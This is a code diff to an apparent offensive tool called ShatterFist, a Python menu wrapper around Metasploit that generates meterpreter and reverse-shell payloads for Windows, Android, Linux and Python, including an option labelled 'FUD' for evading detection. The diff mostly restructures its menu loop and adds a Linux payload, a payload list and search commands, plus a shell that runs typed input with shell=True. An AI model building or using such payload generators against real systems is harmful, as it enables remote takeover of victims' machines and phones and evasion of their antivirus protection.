@@ -8,6 +8,8 @@ import random
 import string 
 import time
 
+from colorama.ansi import Fore
+
 
 
 banner= ('''
@@ -57,6 +59,7 @@ androutfile = "androidpayload.apk"
 linuxoutfile = "linuxpayload.bin"
 defaultarch = "x86"
 talkbackm1 = "tcp"
+run = True
 
 def clearscreen():
     if sys.platform == "linux":
@@ -149,7 +152,6 @@ def pythonpayload():
         #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
         payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, None, None)
         time.sleep(2)
-        menu()
     #PYFUD starts here     
     elif inputpy == "2": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
@@ -186,7 +188,7 @@ def pythonpayloadfud():
     print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
     input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)   
     n = 1  
-    menu()
+
 
 def winpayload():                         
     global n, winoutfile, lhost, lport, talkbackm1
@@ -205,7 +207,6 @@ def winpayload():
     if inputwin == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2(f"windows/meterpreter/reverse_{talkbackm1}", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
-        menu()
     #WinShell    
     elif inputwin == "2":
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
@@ -231,7 +232,6 @@ def androidpayload():
     if inputy == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2(f"android/meterpreter/reverse_{talkbackm1}", lhost, lport, androutfile, '', '')
-        menu()
 
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
@@ -242,7 +242,6 @@ def miscmenu():
     n = 1 
     printopt("")
     time.sleep(2)
-    menu()    
 
 def linuxpayloadmenu():
     global  n, linuxoutfile, lhost, lport, talkbackm1
@@ -254,13 +253,14 @@ def linuxpayloadmenu():
     lask()
     inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({linuxoutfile}){colorama.Fore.BLUE}: ")
     asktb()
+    #ASKARCH
+    arch = inputc(f"Enter payload arch (x86/x64). Leave empty for default {colorama.Fore.LIGHTRED_EX}({defaultarch}){colorama.Fore.BLUE}: ")
     if inputy2.strip() != "":
         linuxoutfile = inputy2
 
     if inputy == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2(f"linux/x86/meterpreter/reverse_{talkbackm1}", lhost, lport, linuxoutfile, '', '-f elf')
-        menu()
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
         time.sleep(2)
@@ -273,13 +273,26 @@ def shell():
     while loop == True:
         try:
             shinput = input(colorama.Fore.RED + colorama.Fore.LIGHTRED_EX + "sfshell> " + colorama.Style.RESET_ALL).strip()
+            #EXIT
             if shinput == "exit":
                 loop = False
+            #SEARCH
             elif shinput == "search":
                 search()
+            #SEARCH CLI
+            elif shinput.split()[0] == "search":
+                for element in shinput.split():
+                    if element != "search":
+                        search2(element)    
+            #HELP    
             elif shinput == "list" or shinput == "help":
                 for element in cmdlist:
                     print(colorama.Fore.LIGHTGREEN_EX + element + colorama.Style.RESET_ALL)
+            #LIST_PAYLOADS        
+            elif shinput == "paylist" or shinput == "list payloads":
+                for element in pldlist:
+                       print( colorama.Fore.LIGHTMAGENTA_EX + "==>" + colorama.Fore.LIGHTWHITE_EX + element + colorama.Style.RESET_ALL)     
+            #SHELL_EXEC           
             else:
                 print(colorama.Fore.BLUE + "[*]Exec " +  colorama.Fore.WHITE + shinput  + "\n" + colorama.Style.RESET_ALL )
                 subprocess.run(shinput, shell=True)
@@ -287,7 +300,6 @@ def shell():
             print( "\n" + colorama.Fore.BLUE + "[" + colorama.Fore.LIGHTWHITE_EX + "*" + colorama.Fore.BLUE  + "]" + colorama.Fore.LIGHTGREEN_EX + "Recieved INTR call exiting..." )
             time.sleep(0.5) 
             loop = False
-            menu()
 
 def search():
     searchstring =  inputc("Enter search string: ").strip()
@@ -302,7 +314,7 @@ def search2(searchstring):
         searchresult = print(colorama.Fore.LIGHTRED_EX + "==> " + colorama.Fore.LIGHTWHITE_EX + item + colorama.Style.RESET_ALL)    
 
 def menu():
-    global n 
+    global n
     n = 1
     clearscreen()
     print(colorama.Fore.LIGHTRED_EX + colorama.Style.BRIGHT + banner3 +  colorama.Style.RESET_ALL)
@@ -323,34 +335,46 @@ def menu():
     if input1 == "1":
         time.sleep(0.1)
         pythonpayload()
+        main()
 
     elif input1 == "2":
         winpayload()
+        main()
 
     elif input1 == "3":
         androidpayload() 
+        main()
 
     elif input1 == "4":
         linuxpayloadmenu()
+        main()
+
+    elif input1 == "s" or input1 == "search":
+        search()
+        main()
 
     elif input1 == "5":
         miscmenu()
+        main()
 
     elif input1 == "a" or input1 == "advanced" or input1 == "shell":
         shell() 
+        main()
 
     elif input1 == "m" or input1 == "msfconsole":
         clearscreen()
         print(colorama.Fore.LIGHTRED_EX)
-        subprocess.run("msfconsole")   
+        subprocess.run("msfconsole") 
+        main()  
     
     elif input1  == "e" or input1 == "exit":
         clearscreen()
         print(colorama.Fore.LIGHTRED_EX)
         bye = "Thanks for using ShatterFist!"
+
         for letter in bye:
             print(letter,end="", flush=True)
-            time.sleep(0.05)
+            time.sleep(0.05)    
         print()
         time.sleep(0.1)
         sys.exit()
@@ -373,6 +397,7 @@ pldlist.append("[5] python/meterpreter/reverse_https")
 pldlist.append("[6] python/shell_reverse_tcp") 
 pldlist.append("[7] android/meterpreter/reverse_tcp")
 pldlist.append("[8] android/meterpreter/reverse_https")
+pldlist.append("[9] linux/x86/meterpreter/reverse_tcp")
 #========================
 #command list 
 #========================
@@ -380,10 +405,22 @@ cmdlist = []
 cmdlist.append("[list] - show this page")
 cmdlist.append("[help] - show this page")
 cmdlist.append("[clear] - clear screen")
-cmdlist.append("[search] -  search for compatible payloads (just search not search <payload>!")
+cmdlist.append("[search] -  search for compatible payloads")
 def main():
     #there for future stuff
     time.sleep(0.1)
-    menu()
-colorama.init()    
-main()                                                          
+    while run == True:  
+        try :
+            menu()
+        except KeyboardInterrupt: 
+            try:
+                print("\n" + colorama.Fore.LIGHTGREEN_EX + "Recieved " + colorama.Fore.LIGHTRED_EX + "INTR " + colorama.Fore.LIGHTGREEN_EX + "call. Returning to menu. Type exit to exit or Ctrl + C again to force exit" + colorama.Style.RESET_ALL)
+                time.sleep(0.2)
+                main()
+            except KeyboardInterrupt:
+                print("Exiting...")  
+                time.sleep(0.1)  
+                sys.exit()
+colorama.init()  
+main()
+                                                         
